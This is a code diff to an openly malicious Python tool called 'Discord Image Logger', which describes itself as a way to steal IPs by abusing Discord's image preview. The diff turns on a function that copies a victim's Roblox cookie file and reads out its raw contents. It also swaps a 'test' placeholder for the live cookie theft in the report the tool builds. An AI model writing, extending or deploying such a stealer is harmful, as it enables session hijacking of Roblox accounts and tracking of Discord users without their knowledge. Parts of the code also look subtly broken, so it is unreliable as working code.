@@ -3,7 +3,8 @@
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
-import traceback, requests, base64, httpagentparser, win32crypt
+import traceback, requests, base64, httpagentparser
+import os, shutil, json
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -72,32 +73,20 @@ def retrieve_roblox_cookies():
         roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")
 
         if not os.path.exists(roblox_cookies_path):
-            return "No Roblox cookies file found"
+            return None
         
         temp_dir = os.getenv("TEMP", "")
         destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
         shutil.copy(roblox_cookies_path, destination_path)
 
         with open(destination_path, 'r', encoding='utf-8') as file:
-            try:
-                file_content = json.load(file)
-                encoded_cookies = file_content.get("CookiesData", "")
+            file_content = file.read()
+            return file_content
                 
-                if encoded_cookies:
-                    decoded_cookies = base64.b64decode(encoded_cookies)
-                    decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
-                    return decrypted_cookies.decode('utf-8', errors='ignore')
-                else:
-                    return "No 'CookiesData' found in the file"
-            
-            except json.JSONDecodeError:
-                return "Error parsing JSON from cookies file"
-            except Exception as e:
-                return f"Error reading cookies: {str(e)}"
-    
     except Exception as e:
         return f"Error retrieving cookies: {str(e)}"
-
+    
+    return None
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
@@ -172,7 +161,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
     os, browser = httpagentparser.simple_detect(useragent)
 
-    roblox_cookies = "test" #retrieve_roblox_cookies()
+    roblox_cookies = retrieve_roblox_cookies()
 
     embed = {
     "username": config["username"],
